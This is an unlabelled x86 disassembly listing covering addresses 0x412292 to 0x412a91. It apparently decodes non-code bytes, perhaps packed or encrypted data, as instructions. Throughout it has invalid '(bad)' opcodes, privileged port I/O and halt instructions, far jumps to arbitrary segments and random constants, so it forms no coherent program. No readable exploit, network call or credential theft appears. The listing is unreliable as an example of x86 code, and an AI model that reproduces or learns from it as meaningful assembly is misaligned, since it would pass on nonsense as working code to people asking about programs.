  412292:	fisubr DWORD PTR [ecx-0x33a43c28]
  412298:	test   eax,0x6d53c60
  41229d:	sub    ecx,DWORD PTR [ebp-0x366bc1b4]
  4122a3:	arpl   WORD PTR [ebp-0x64],di
  4122a6:	jne    0x412317
  4122a8:	sbb    DWORD PTR [edi],eax
  4122aa:	inc    eax
  4122ab:	ret    0xfd8a
  4122ae:	jmp    0x8f10:0xf7f98a78
  4122b5:	inc    eax
  4122b6:	lds    esp,FWORD PTR [edi+ebp*2-0x141d380a]
  4122bd:	shl    BYTE PTR [eax],cl
  4122bf:	xchg   edx,eax
  4122c0:	mov    al,ds:0xcab0154f
  4122c5:	xchg   ecx,eax
  4122c6:	cmp    dl,BYTE PTR [edi-0x238c40cf]
  4122cc:	int    0x10
  4122ce:	jns    0x41225e
  4122d0:	in     eax,0xff
  4122d2:	sub    al,0xfb
  4122d4:	mov    bl,0xd
  4122d6:	fsqrt  
  4122d8:	cwde   
  4122d9:	sub    BYTE PTR [esi-0x595ab956],al
  4122df:	push   edx
  4122e0:	sub    BYTE PTR [edi-0xc],bl
  4122e3:	ret    
  4122e4:	jae    0x4122ca
  4122e6:	push   edi
  4122e7:	xlat   BYTE PTR ss:[ebx]
  4122e9:	clc    
  4122ea:	mov    dl,BYTE PTR [eax]
  4122ec:	sub    BYTE PTR [edi],0x7
  4122ef:	push   esp
  4122f0:	lahf   
  4122f1:	je     0x412296
  4122f3:	fst    DWORD PTR [eax-0x71]
  4122f6:	test   ebp,eax
  4122f8:	std    
  4122f9:	push   ss
  4122fa:	adc    eax,0x379bfda5
  4122ff:	mov    eax,ds:0xf2aa6ad3
  412304:	call   0xae60:0xa6695948
  41230b:	sbb    al,0x7d
  41230d:	fdivp  st(3),st
  41230f:	cwde   
  412310:	std    
  412311:	movnti DWORD PTR [eax+0x4f],ebx
  412315:	repz jno 0x4122b5
  412318:	mov    cl,bl
  41231a:	and    BYTE PTR [ebx],cl
  41231c:	les    esi,FWORD PTR [ebp+0x6ae2cefe]
  412322:	xchg   esi,eax
  412323:	mov    edx,0x7121cb0a
  412328:	out    dx,eax
  412329:	cmp    DWORD PTR [edi+0x5151ad94],ebp
  41232f:	mov    ebp,0xdfe18f88
  412334:	mov    eax,ds:0x74a958eb
  412339:	xor    edi,DWORD PTR [edx+0xa]
  41233c:	add    eax,DWORD PTR [ebp+0x3856e910]
  412342:	(bad)  
  412343:	pop    ebp
  412344:	in     eax,dx
  412345:	xchg   DWORD PTR [ebx-0x5c8c0902],esi
  41234b:	mov    esi,0x2a20fce2
  412350:	xchg   BYTE PTR [esi-0x4a],bh
  412353:	stc    
  412354:	fistp  WORD PTR [esi]
  412356:	int3   
  412357:	test   al,0x20
  412359:	sub    DWORD PTR [esi-0x30],0x55fb9978
  412360:	fs mov esi,0x4de884a7
  412366:	imul   esp,DWORD PTR [edi+0x69],0x33
  41236a:	outs   dx,BYTE PTR ds:[esi]
  41236b:	mov    dl,0x95
  41236d:	daa    
  41236e:	sbb    BYTE PTR ds:0x99236c72,0x4d
  412375:	and    DWORD PTR [esi],esp
  412377:	dec    ecx
  412378:	jg     0x4122fd
  41237a:	xor    bh,bl
  41237c:	and    DWORD PTR [ecx-0x3473a92a],0xf003e13a
  412386:	out    dx,eax
  412387:	push   ss
  412388:	push   edx
  412389:	xor    cl,dl
  41238b:	push   0x1a827e7a
  412390:	dec    ecx
  412391:	sub    BYTE PTR [esi+edx*2-0x2],ah
  412395:	adc    DWORD PTR [edi],ebp
  412397:	shl    DWORD PTR [edi],1
  412399:	push   ebp
  41239a:	inc    edx
  41239b:	xchg   edx,eax
  41239c:	stos   DWORD PTR es:[edi],eax
  41239d:	push   eax
  41239e:	pop    es
  41239f:	push   0xffffffef
  4123a1:	push   ds
  4123a2:	sbb    eax,0xb098990f
  4123a7:	sar    DWORD PTR [edx+0x1ef1e28f],1
  4123ad:	cmp    BYTE PTR [edx-0x3561783a],ch
  4123b3:	outs   dx,DWORD PTR ds:[esi]
  4123b4:	cmp    BYTE PTR [ebx-0x1e4eebb7],bl
  4123ba:	imul   esp,DWORD PTR [edx-0x41ccbb7f],0xffffffc4
  4123c1:	push   0x19367dc7
  4123c6:	outs   dx,BYTE PTR ds:[esi]
  4123c7:	push   ecx
  4123c8:	cmp    al,0x0
  4123ca:	mov    dl,0x2e
  4123cc:	stc    
  4123cd:	test   BYTE PTR [ecx+0x72e94fb2],0x19
  4123d4:	jl     0x412414
  4123d6:	xchg   esi,eax
  4123d7:	ret    0xe163
  4123da:	pop    eax
  4123db:	(bad)  
  4123dc:	sti    
  4123dd:	adc    BYTE PTR [eax],ah
  4123df:	or     DWORD PTR [ebp-0x3a],ebp
  4123e2:	mov    BYTE PTR [ebx+0x1a],al
  4123e5:	sub    ebp,esp
  4123e7:	or     ebp,DWORD PTR [ebx-0x47]
  4123ea:	push   edx
  4123eb:	sbb    ch,BYTE PTR [edi]
  4123ed:	bound  ebp,QWORD PTR [ebp-0x3d714d25]
  4123f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f4:	mov    ds:0x90029932,al
  4123f9:	jl     0x412390
  4123fb:	mov    DWORD PTR [edi-0x74],edi
  4123fe:	cmp    BYTE PTR [di+0x2e1e],bl
  412403:	mov    dh,0xa9
  412405:	test   BYTE PTR [edi-0x48e66e76],cl
  41240b:	sub    edi,DWORD PTR [ebx+edi*8]
  41240e:	sar    DWORD PTR [ecx-0x40971eaf],cl
  412414:	mov    ch,0x35
  412416:	mov    dl,0xaf
  412418:	(bad)  
  412419:	inc    DWORD PTR [eax-0x25d2d72c]
  41241f:	mov    BYTE PTR [ebx-0x23b9ebc4],ch
  412425:	push   eax
  412426:	imul   BYTE PTR [ecx+0x62cc4a8f]
  41242c:	and    dh,BYTE PTR [edx-0xd]
  41242f:	pop    ds
  412430:	in     al,0xa7
  412432:	xor    ebx,DWORD PTR [edi]
  412434:	popa   
  412435:	sub    ch,BYTE PTR [ecx]
  412437:	hlt    
  412438:	out    dx,al
  412439:	or     edx,esi
  41243b:	sar    BYTE PTR [ebx+ecx*8+0x44],cl
  41243f:	ror    ch,1
  412441:	xor    bh,BYTE PTR [edi]
  412443:	jmp    0x4123c8
  412445:	sbb    bl,BYTE PTR [edi-0x2b]
  412448:	sbb    eax,0x75e4bc6f
  41244d:	sub    edi,ebx
  41244f:	pop    esi
  412450:	(bad)
  412453:	jp     0x4124c8
  412455:	lods   eax,DWORD PTR ds:[esi]
  412457:	pushf  
  412458:	(bad)  [ebx-0x6b]
  41245b:	aaa    
  41245c:	jno    0x4124c4
  41245e:	lds    esp,FWORD PTR [esi+ebp*4-0x480c1269]
  412465:	orps   xmm2,xmm7
  412468:	xchg   edx,eax
  412469:	les    edi,FWORD PTR [edx-0x73809753]
  41246f:	jge    0x4124e4
  412471:	shr    BYTE PTR [esi],0x8e
  412474:	jle    0x41244c
  412476:	mov    eax,0x2fd8bdc3
  41247b:	pop    edi
  41247c:	cmc    
  41247d:	cmp    al,0x72
  41247f:	daa    
  412480:	or     BYTE PTR [ebx+0x7e],ch
  412483:	into   
  412484:	add    eax,0xe02fb11
  412489:	and    dh,bh
  41248b:	(bad)  [esi-0x19]
  41248e:	ret    0xc352
  412491:	sbb    dh,BYTE PTR [ebp+0x6f3e3b8]
  412497:	jo     0x41242f
  412499:	mov    eax,DWORD PTR [edi]
  41249b:	fsubr  QWORD PTR [eax+0x40]
  41249e:	(bad)  
  41249f:	cwde   
  4124a0:	pop    ds
  4124a1:	aas    
  4124a2:	mov    cl,0x97
  4124a4:	dec    edi
  4124a5:	pop    esp
  4124a6:	or     al,0x7f
  4124a8:	lods   eax,DWORD PTR ds:[esi]
  4124a9:	add    al,0x7d
  4124ab:	jmp    0xd212:0x73c45a97
  4124b2:	imul   DWORD PTR fs:[ebx+0x44]
  4124b6:	shl    DWORD PTR [edx+ecx*2-0x2fccb7a8],1
  4124bd:	sbb    DWORD PTR [ebp-0x4f987b1b],0x6f
  4124c4:	fist   DWORD PTR [edi]
  4124c6:	xlat   BYTE PTR ds:[ebx]
  4124c7:	and    DWORD PTR [ebp+0x7155f10],0xea27cb34
  4124d1:	push   esp
  4124d2:	es xor ebp,edx
  4124d5:	jge    0x41249f
  4124d7:	ficomp WORD PTR es:[eax-0x62415774]
  4124de:	loopne 0x4124a5
  4124e0:	jg     0x41255e
  4124e2:	mov    edx,0x1e6a0650
  4124e7:	sub    DWORD PTR [eax+0x7cdae821],ebp
  4124ed:	stos   DWORD PTR es:[edi],eax
  4124ee:	xor    al,0xbb
  4124f0:	xor    DWORD PTR [edi],esp
  4124f2:	rol    DWORD PTR [eax+ebx*4-0x4ab03b0],1
  4124f9:	in     al,dx
  4124fa:	lods   al,BYTE PTR ds:[esi]
  4124fb:	dec    esp
  4124fc:	fsubr  QWORD PTR [ebp+0x20]
  4124ff:	jg     0x4124e8
  412501:	adc    eax,0x8b36b62a
  412506:	mov    es,ebp
  412508:	push   esi
  412509:	adc    DWORD PTR [edi],ecx
  41250b:	je     0x41248e
  41250d:	loopne 0x4124ed
  41250f:	inc    esp
  412510:	or     ebx,DWORD PTR [edx-0x1e]
  412513:	shld   DWORD PTR [ebp+0x55b333ec],ebp,cl
  41251a:	jo     0x41252e
  41251c:	add    al,0x9b
  41251e:	lea    esi,[edx]
  412520:	mov    al,ds:0x2d33c7bb
  412525:	fld    TBYTE PTR [edi+0x25]
  412528:	inc    BYTE PTR ds:0xcb609324
  41252e:	sub    DWORD PTR [esp+edx*8-0x2f8c061c],esi
  412535:	pop    esp
  412536:	ficomp DWORD PTR [esi-0x5c]
  412539:	inc    eax
  41253a:	and    bl,BYTE PTR [edx-0x3a]
  41253d:	(bad)  
  41253e:	iret   
  41253f:	or     BYTE PTR [edi-0x1],dl
  412542:	push   esp
  412543:	jns    0x412520
  412545:	(bad)  
  412546:	dec    edi
  412547:	jnp    0x4124dc
  412549:	xor    edi,0x63cdbd7
  41254f:	sub    eax,DWORD PTR [esi-0x5ab970f0]
  412555:	xor    eax,0xde4c60e9
  41255a:	jle    0x412523
  41255c:	test   DWORD PTR [ebx],esp
  41255e:	mov    bh,0x9
  412560:	es adc eax,0x4ea638b1
  412566:	inc    edi
  412567:	pop    ds
  412568:	sbb    cl,cl
  41256a:	sbb    DWORD PTR [edi+0x2f],ebx
  41256d:	xchg   edx,eax
  41256e:	mov    ah,0x86
  412570:	in     al,dx
  412571:	ds clc 
  412573:	rcl    DWORD PTR [ebx-0x53],0xe7
  412577:	nop
  412578:	js     0x412505
  41257a:	pop    edx
  41257b:	add    DWORD PTR [esi],ebp
  41257d:	mul    BYTE PTR [edi-0x6c]
  412580:	sub    ch,dl
  412582:	jle    0x41251d
  412584:	cmp    edi,DWORD PTR [esi-0x5a]
  412587:	or     al,0xa9
  412589:	or     cl,BYTE PTR [ebx]
  41258b:	popf   
  41258c:	push   ebx
  41258d:	inc    edx
  41258e:	fimul  DWORD PTR [edi+0x21edcceb]
  412594:	xchg   ebx,eax
  412595:	or     dl,BYTE PTR [ecx]
  412597:	xchg   ecx,eax
  412598:	mov    eax,ds:0x49115693
  41259d:	push   0x4bb62dfa
  4125a2:	push   edi
  4125a3:	jno    0x412597
  4125a5:	fwait
  4125a6:	mov    edi,ecx
  4125a8:	adc    bl,BYTE PTR [esi-0x70ba1f98]
  4125ae:	rcl    BYTE PTR [esi+0x7f],1
  4125b1:	and    DWORD PTR [edx+0x15],edi
  4125b4:	sahf   
  4125b5:	es adc ebp,DWORD PTR ss:[esi-0x6313a3b5]
  4125bd:	sbb    BYTE PTR [edx+edx*2-0x232a6e04],bl
  4125c4:	js     0x412579
  4125c6:	add    DWORD PTR [ecx-0x5f8588d7],ebx
  4125cc:	clc    
  4125cd:	outs   dx,DWORD PTR ds:[esi]
  4125ce:	repz popf 
  4125d0:	sbb    ebx,DWORD PTR [esp+eiz*4-0x2cc7f500]
  4125d7:	in     eax,dx
  4125d8:	arpl   sp,di
  4125da:	nop
  4125db:	lods   al,BYTE PTR ds:[esi]
  4125dc:	ins    BYTE PTR es:[edi],dx
  4125dd:	adc    eax,0xa1eb880f
  4125e2:	push   cs
  4125e3:	mov    dl,0xe6
  4125e5:	jmp    0x8fdf7a50
  4125ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125eb:	and    BYTE PTR [esi-0x74],dh
  4125ee:	mov    esp,0xe7326937
  4125f3:	fnstsw WORD PTR [ebx-0x2b]
  4125f6:	fdiv   QWORD PTR [edi]
  4125f8:	dec    esi
  4125f9:	inc    ecx
  4125fa:	push   cs
  4125fb:	inc    edi
  4125fc:	mov    ah,0x8d
  4125fe:	mov    dh,0xd7
  412600:	inc    ebp
  412601:	out    dx,eax
  412602:	xor    BYTE PTR [ecx-0xa],0x44
  412606:	pop    ebp
  412607:	sub    eax,0xb8d68b49
  41260c:	mov    al,ds:0xd79ea580
  412611:	out    0x74,al
  412613:	mov    ds:0x9bcd77eb,eax
  412618:	sbb    al,0x9f
  41261a:	jne    0x4125f8
  41261c:	add    DWORD PTR [edx+0x294c2f1a],0xe1e7a793
  412626:	std    
  412627:	mov    bh,0x64
  412629:	les    eax,FWORD PTR [edx]
  41262b:	mov    ebx,0x96121d31
  412630:	test   edx,ecx
  412632:	test   eax,0x7af21c49
  412637:	dec    esp
  412638:	sbb    al,0xa
  41263a:	imul   esp,DWORD PTR [ecx+0x4e],0xa777ca7d
  412641:	pop    ecx
  412642:	sbb    DWORD PTR ds:0x5530cfef,0x5b17f5fa
  41264c:	les    ebp,FWORD PTR [edi+0x31]
  41264f:	pop    es
  412650:	icebp  
  412651:	pop    eax
  412652:	add    al,0xb5
  412654:	retf   
  412655:	push   eax
  412656:	mov    ah,0xf6
  412658:	push   eax
  412659:	in     eax,0x2e
  41265b:	bound  ebx,QWORD PTR ds:0x9689fd0
  412661:	or     ch,al
  412663:	fisubr DWORD PTR [ebx+0x6f4300c1]
  412669:	mov    al,0xcc
  41266b:	(bad)  
  41266c:	repnz adc dl,dh
  41266f:	data16 fiadd DWORD PTR [ecx-0x5e]
  412673:	push   ebp
  412674:	push   edx
  412675:	je     0x4126da
  412677:	out    0x55,eax
  412679:	out    0x1b,eax
  41267b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267c:	cld    
  41267d:	or     al,0xe1
  41267f:	pop    ds
  412680:	or     al,0x3c
  412682:	inc    esi
  412683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412684:	push   0xffffffec
  412686:	pop    es
  412687:	cld    
  412688:	push   ds
  412689:	mov    WORD PTR [eax],fs
  41268b:	jg     0x412649
  41268d:	push   ecx
  41268e:	popf   
  41268f:	mov    eax,fs:0x8cd8133c
  412695:	adc    al,0x90
  412697:	lods   eax,DWORD PTR ds:[esi]
  412698:	xchg   BYTE PTR [ecx+ebx*4-0x33],cl
  41269c:	pop    edi
  41269d:	and    ch,ch
  41269f:	cmp    DWORD PTR [bp+di-0x13],ebp
  4126a3:	and    eax,0xd9a37833
  4126a8:	dec    ebx
  4126a9:	mov    ebx,0xd1fe21a4
  4126ae:	hlt    
  4126af:	lds    esp,FWORD PTR [ebx+ebp*8]
  4126b2:	inc    ebx
  4126b3:	les    edx,FWORD PTR [ebp-0x27f74f6e]
  4126b9:	xchg   esi,eax
  4126ba:	xchg   ecx,eax
  4126bb:	mov    bh,0x76
  4126bd:	(bad)  
  4126be:	mov    ch,0xb2
  4126c0:	or     eax,0x2e1b3e4c
  4126c5:	arpl   WORD PTR [edi+0x5e],si
  4126c8:	sbb    BYTE PTR [edx+0x58],bh
  4126cb:	sar    BYTE PTR [ebp-0x575f861c],1
  4126d1:	fistp  WORD PTR [esi+ebp*1+0x6]
  4126d5:	push   0xffffffc1
  4126d7:	mov    DWORD PTR [ebp-0x60],edi
  4126da:	add    edi,DWORD PTR [edi]
  4126dc:	popa   
  4126dd:	fld    QWORD PTR [esi-0x1d]
  4126e0:	inc    esp
  4126e1:	or     ch,dl
  4126e3:	(bad)  
  4126e4:	icebp  
  4126e5:	fscale 
  4126e7:	ds jecxz 0x41272d
  4126ea:	xchg   esi,eax
  4126eb:	jmp    0xe762:0xded3781b
  4126f2:	adc    cl,ch
  4126f4:	mov    ecx,0xe942a92c
  4126f9:	add    ah,dh
  4126fb:	mov    bh,0xdf
  4126fd:	call   0xcf1d:0x89c80c45
  412704:	push   ebp
  412705:	cmp    al,0x77
  412707:	jmp    0x412787
  412709:	mov    dl,0x2e
  41270b:	pusha  
  41270c:	aas    
  41270d:	rcr    BYTE PTR [eax+0xe],1
  412710:	push   ecx
  412711:	mov    ch,0x81
  412713:	cmp    DWORD PTR [ecx+0x3aa6e4f8],ebx
  412719:	add    al,0xcb
  41271b:	lahf   
  41271c:	or     esp,edi
  41271e:	inc    ebx
  41271f:	jae    0x412746
  412721:	fwait
  412722:	mov    esi,DWORD PTR [esi+0x66ff6ff5]
  412728:	lods   al,BYTE PTR ds:[esi]
  412729:	mov    ecx,0x329cd4bf
  41272e:	aad    0x4c
  412730:	xchg   DWORD PTR [ebx],eax
  412732:	stc    
  412733:	mul    BYTE PTR [ecx]
  412735:	(bad)  
  412736:	xchg   esi,eax
  412737:	jg     0x4126cb
  412739:	shr    BYTE PTR [edx],cl
  41273b:	adc    al,0x1
  41273d:	xchg   edi,eax
  41273e:	lahf   
  41273f:	ret    0x43b
  412742:	lods   al,BYTE PTR ds:[esi]
  412743:	mov    ds:0x4b19b829,al
  412748:	mov    ebx,0x89241697
  41274d:	into   
  41274e:	add    dl,BYTE PTR [esi+0x64]
  412751:	cmp    ch,ch
  412753:	stc    
  412754:	pop    edi
  412755:	sub    DWORD PTR [edx+0x3cba2541],ebx
  41275b:	or     eax,0x8659aae8
  412760:	imul   eax,DWORD PTR [ecx],0xffffff99
  412763:	jae    0x4126f1
  412765:	mov    dh,0x18
  412767:	fisttp WORD PTR [eiz*2-0x30c21cea]
  41276e:	js     0x4127bb
  412770:	hlt    
  412771:	cmp    ah,bh
  412773:	or     eax,DWORD PTR [edx]
  412775:	lods   eax,DWORD PTR ds:[esi]
  412776:	push   esp
  412777:	mov    eax,ds:0x8b108996
  41277c:	mov    BYTE PTR [esi],al
  41277e:	icebp  
  41277f:	dec    eax
  412780:	adc    al,bl
  412782:	push   0xb988f627
  412787:	je     0x412722
  412789:	and    DWORD PTR [ecx-0x57],esi
  41278c:	ds mov esi,0x4610063d
  412792:	add    al,0xd8
  412794:	mov    ds:0x20a688a3,eax
  412799:	loopne 0x4127de
  41279b:	dec    edi
  41279c:	pop    eax
  41279d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279e:	mov    edi,0x7b77092e
  4127a3:	sbb    al,0xc
  4127a5:	jge    0x4127e4
  4127a7:	jl     0x41273c
  4127a9:	sub    ebx,edx
  4127ab:	jl     0x4127bd
  4127ad:	jp     0x412827
  4127af:	cld    
  4127b0:	jle    0x412740
  4127b2:	push   0xffffffb6
  4127b4:	xchg   BYTE PTR [ecx],bl
  4127b6:	ds push esi
  4127b8:	aas    
  4127b9:	ins    BYTE PTR es:[edi],dx
  4127ba:	cmp    DWORD PTR [esi-0x5cd21b76],esi
  4127c0:	fwait
  4127c1:	cmp    ebp,edi
  4127c3:	pop    eax
  4127c4:	in     eax,0xc6
  4127c6:	aaa    
  4127c7:	or     ecx,ebx
  4127c9:	ss sub dh,ah
  4127cc:	adc    al,0xba
  4127ce:	outs   dx,BYTE PTR ds:[esi]
  4127cf:	sbb    ebx,DWORD PTR [esi-0x53d78c54]
  4127d5:	xchg   esi,eax
  4127d6:	sbb    BYTE PTR [ecx-0x73a3b79d],cl
  4127dc:	pop    ebx
  4127dd:	dec    ebx
  4127de:	mov    dl,0x74
  4127e0:	jmp    0x8b2c4671
  4127e5:	std    
  4127e6:	in     eax,0x99
  4127e8:	daa    
  4127e9:	push   ebx
  4127ea:	pop    eax
  4127eb:	imul   eax,DWORD PTR [esi+0x4b],0xcf739002
  4127f2:	push   cs
  4127f3:	adc    dl,0x3e
  4127f6:	mov    DWORD PTR [ebx-0x47],edx
  4127f9:	or     DWORD PTR [esi-0x36fe4884],eax
  4127ff:	sub    eax,eax
  412801:	gs jle 0x412801
  412804:	outs   dx,BYTE PTR ds:[esi]
  412805:	(bad)  [ecx+0x73cdf455]
  41280b:	pop    es
  41280c:	or     dl,ah
  41280e:	(bad)  
  41280f:	hlt    
  412810:	arpl   WORD PTR [eax],cx
  412812:	sbb    edx,edi
  412814:	jno    0x41282c
  412816:	not    DWORD PTR [esi+0x64]
  412819:	out    dx,al
  41281a:	or     DWORD PTR [eax-0x815e87a],ebx
  412820:	mov    al,0x75
  412822:	inc    edx
  412823:	jbe    0x4127c6
  412825:	fmul   st(3),st
  412827:	add    al,0x91
  412829:	sahf   
  41282a:	sub    BYTE PTR [ebp+0x4cfc5fc3],al
  412830:	fcom   QWORD PTR [bx+di-0x241d]
  412835:	add    esi,DWORD PTR [eax+0x2e]
  412838:	ror    bl,0x79
  41283b:	xlat   BYTE PTR ds:[ebx]
  41283c:	in     eax,0x5
  41283e:	xchg   edi,eax
  41283f:	shr    cl,1
  412841:	outs   dx,DWORD PTR ds:[esi]
  412842:	popa   
  412843:	xor    DWORD PTR [esi-0x70937643],esi
  412849:	and    eax,0x6a7e0afc
  41284e:	nop
  41284f:	cmp    DWORD PTR [esi],0xffffffdf
  412852:	cmp    ch,bl
  412854:	inc    ebx
  412855:	sub    eax,0xeff4db19
  41285a:	std    
  41285b:	add    DWORD PTR [edi+0x4c],eax
  41285e:	sub    edi,DWORD PTR [edx+0x3c]
  412861:	and    DWORD PTR [edi+0x1414069d],ebp
  412867:	fdiv   DWORD PTR [ebp+0x6a]
  41286a:	aam    0xba
  41286c:	mov    ds:0x5e248ad0,eax
  412871:	jecxz  0x412838
  412873:	jmp    0xa2f2:0x4d571e52
  41287a:	je     0x412881
  41287c:	dec    esi
  41287d:	das    
  41287e:	mov    DWORD PTR [esi-0x22],ebp
  412881:	jae    0x412826
  412883:	cld    
  412884:	data16 das 
  412886:	fild   DWORD PTR [eax+esi*1-0x6b0f7142]
  41288d:	ret    
  41288e:	ret    
  41288f:	sbb    eax,0x3342753e
  412894:	pop    ds
  412895:	mov    ebp,0xf3769603
  41289a:	scas   al,BYTE PTR es:[edi]
  41289b:	push   eax
  41289c:	push   ecx
  41289d:	int3   
  41289e:	sub    BYTE PTR [edi],ch
  4128a0:	add    BYTE PTR [eax],bh
  4128a2:	adc    esi,ecx
  4128a4:	bndstx [ecx],bnd1
  4128a7:	lock xchg ebx,eax
  4128a9:	enter  0x1002,0xbb
  4128ad:	jmp    0x57b1:0x96e75a5b
  4128b4:	shl    BYTE PTR [esi+0x5b],1
  4128b7:	adc    al,0x9c
  4128b9:	mov    ch,0x50
  4128bb:	pop    ds
  4128bc:	mov    ch,0xb7
  4128be:	leave  
  4128bf:	push   0x5df4bb5f
  4128c4:	sub    dl,BYTE PTR [ebp+0x6dc077db]
  4128ca:	adc    al,0x1
  4128cc:	sub    esi,edx
  4128ce:	sub    BYTE PTR [ecx],ch
  4128d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d1:	xchg   ebx,eax
  4128d2:	jbe    0x412918
  4128d4:	pop    ecx
  4128d5:	cmp    ch,BYTE PTR [edx+0x22af455b]
  4128db:	test   BYTE PTR [edx],bh
  4128dd:	pop    edx
  4128de:	adc    eax,0x43ac8311
  4128e3:	fwait
  4128e4:	adc    DWORD PTR [esi+ebx*4+0x54],esi
  4128e8:	xor    ch,ch
  4128ea:	or     al,0xbc
  4128ec:	xchg   esp,ebp
  4128ee:	retf   0x2f4d
  4128f1:	cmp    eax,0xad4dc8a6
  4128f6:	xchg   edx,eax
  4128f7:	mov    DWORD PTR ds:[ebx-0x386d4075],0x963ba8d7
  412902:	cmp    DWORD PTR [esi+0x39],ecx
  412905:	and    esi,DWORD PTR [edi]
  412907:	data16 xchg BYTE PTR [ebp+ebx*2+0x3a782d47],bh
  41290f:	pop    esi
  412910:	gs push ebp
  412912:	in     al,0x9c
  412914:	jno    0x4128d9
  412916:	call   0xed51e562
  41291b:	jg     0x4128e6
  41291d:	ja     0x4128cf
  41291f:	add    DWORD PTR [edi-0x59ea90e0],edi
  412925:	aaa    
  412926:	xor    BYTE PTR [eax+0x611042bc],0xd6
  41292d:	repnz push eax
  41292f:	dec    esp
  412930:	lds    ebx,FWORD PTR [edx+esi*8]
  412933:	rol    DWORD PTR [edx],0x29
  412936:	xor    dl,BYTE PTR [ecx-0x5543f99b]
  41293c:	fsubr  QWORD PTR [edx+0x4963b68c]
  412943:	pop    esp
  412944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412945:	je     0x4128f4
  412947:	inc    edi
  412948:	pop    eax
  412949:	mov    ebp,0x5a18d6ba
  41294e:	push   0xffffffad
  412950:	pop    ss
  412951:	addr16 push edx
  412953:	cmp    eax,0xc0a29f94
  412958:	repz gs retf 
  41295b:	cs sahf 
  41295d:	test   eax,0x322c4151
  412962:	jne    0x412962
  412964:	adc    BYTE PTR [ebp+0x7f],cl
  412967:	fwait
  412968:	mov    ds,WORD PTR [ecx]
  41296a:	(bad)  
  41296b:	sti    
  41296c:	lds    eax,FWORD PTR ds:0x5814971a
  412972:	dec    eax
  412973:	xor    ebx,DWORD PTR [edi+0x3adc5497]
  412979:	and    DWORD PTR [eax+0x4e277440],ebx
  41297f:	sahf   
  412980:	mov    ?,WORD PTR [eax-0x4f]
  412983:	ins    DWORD PTR es:[edi],dx
  412984:	mov    ds:0xcedec63c,eax
  412989:	and    ah,bh
  41298b:	arpl   dx,ax
  41298d:	xchg   edi,eax
  41298e:	mov    ebp,0x4140918b
  412993:	add    DWORD PTR [edi-0x6208e457],ebx
  412999:	mov    dl,0x54
  41299b:	test   BYTE PTR [edi+0x328b637f],bh
  4129a1:	imul   ebx,eax,0x36
  4129a4:	pushf  
  4129a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129a6:	mov    ds:0xc108bea4,eax
  4129ab:	arpl   WORD PTR [esi],bp
  4129ad:	pop    ecx
  4129ae:	cli    
  4129af:	xchg   edx,edi
  4129b1:	or     ebp,DWORD PTR [edx+ebp*1+0x6435b09b]
  4129b8:	push   edx
  4129b9:	fninit 
  4129bb:	mov    al,ds:0xd222669c
  4129c0:	cmp    DWORD PTR [esi],edi
  4129c2:	add    al,0x73
  4129c4:	dec    edx
  4129c5:	rcl    DWORD PTR ds:0x106b1f18,0xfc
  4129cc:	cmc    
  4129cd:	test   cl,ch
  4129cf:	and    BYTE PTR [edi],al
  4129d1:	xchg   ebp,eax
  4129d2:	mov    ecx,DWORD PTR [eax]
  4129d4:	leave  
  4129d5:	jns    0x412a51
  4129d7:	inc    ebp
  4129d8:	inc    ecx
  4129d9:	adc    BYTE PTR [edi-0x1e801b78],dh
  4129df:	rol    BYTE PTR [ebx-0xf],1
  4129e2:	pop    ebp
  4129e3:	aas    
  4129e4:	pop    esi
  4129e5:	jnp    0x412a39
  4129e7:	loope  0x4129c1
  4129e9:	xor    al,0x23
  4129eb:	mov    cl,BYTE PTR [edi+0x3eada444]
  4129f1:	pop    es
  4129f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129f3:	inc    edi
  4129f4:	gs into 
  4129f6:	(bad)  [eax+ebp*4+0x66]
  4129fa:	aad    0x76
  4129fc:	xchg   ebx,eax
  4129fd:	std    
  4129fe:	sti    
  4129ff:	das    
  412a00:	and    al,0xa3
  412a02:	adc    eax,0xf0f3557b
  412a07:	push   eax
  412a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a09:	es icebp 
  412a0b:	pop    esp
  412a0c:	pop    ebp
  412a0d:	sar    DWORD PTR [ebx+edx*4-0x681fa02f],cl
  412a14:	(bad)  
  412a15:	mov    ecx,0x4105f07c
  412a1a:	mov    BYTE PTR [edx-0x20],ah
  412a1d:	aaa    
  412a1e:	dec    eax
  412a1f:	shl    BYTE PTR [ecx-0x43],1
  412a22:	fwait
  412a23:	sbb    ebx,DWORD PTR [edx-0x23]
  412a26:	add    ecx,DWORD PTR [esi-0x6ed97d80]
  412a2c:	(bad)
  412a2f:	sub    ebx,DWORD PTR [esi]
  412a31:	fwait
  412a32:	(bad)  
  412a33:	retf   0x777b
  412a36:	lock jns 0x4129f5
  412a39:	push   ebx
  412a3a:	jmp    0xeed7:0xc1bcd3f1
  412a41:	rcr    eax,1
  412a43:	add    cl,0xfc
  412a46:	test   DWORD PTR [esi],esp
  412a48:	stc    
  412a49:	lds    esp,FWORD PTR [ecx+0x27260766]
  412a4f:	jo     0x4129d5
  412a51:	aam    0x1c
  412a53:	xor    DWORD PTR [eax-0x2aad0b8f],ebp
  412a59:	sub    bl,BYTE PTR [edi+0x15]
  412a5c:	scas   eax,DWORD PTR es:[edi]
  412a5d:	outs   dx,DWORD PTR ds:[esi]
  412a5e:	and    eax,0x14aa04c3
  412a63:	cmp    BYTE PTR [ecx+0x46],0x73
  412a67:	xor    DWORD PTR [ebx-0x5220c2e],ecx
  412a6d:	push   esi
  412a6e:	cmp    DWORD PTR [ebp+0x476d7d33],ebx
  412a74:	mov    ch,BYTE PTR [ebx-0x1a]
  412a77:	mov    esi,0x6de6d907
  412a7c:	push   ss
  412a7d:	cmp    ebp,esp
  412a7f:	popf   
  412a80:	stc    
  412a81:	push   eax
  412a82:	jle    0x412a1e
  412a84:	pop    es
  412a85:	inc    esp
  412a86:	test   al,bh
  412a88:	das    
  412a89:	xor    DWORD PTR [edi],ebx
  412a8b:	cmp    ebp,DWORD PTR [ebx+0xd7c6d18]
  412a91:	or     BYTE PTR [ecx+0x7f],0x10
